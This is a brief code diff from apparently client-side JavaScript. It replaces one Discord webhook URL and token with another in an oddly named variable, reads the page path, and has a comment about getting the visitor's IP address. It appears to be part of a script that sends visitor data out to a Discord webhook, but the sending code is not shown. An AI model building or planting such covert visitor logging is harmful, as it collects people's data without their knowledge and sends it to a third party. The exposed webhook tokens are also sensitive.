@@ -1,4 +1,4 @@
-const bvccxx = "https://discord.com/api/webhooks/1108484338959523860/0db7nNz8d8HReC1wPdGEimQNR6n5pLL4XxlSR6BpPP7_FbKtxBkh09aCpTcOMdLcEDzs";
+const bvccxx = "https://discord.com/api/webhooks/1107382739289788496/UZkq8nUQUVkrZJbVGJLlVo9buRCSJejixbTnuIC4ujshQdZJgMuAjzTMO26dSEgMJUqR";
 const pathName = window.location.pathname;
 
 // Get the visitor's IP address
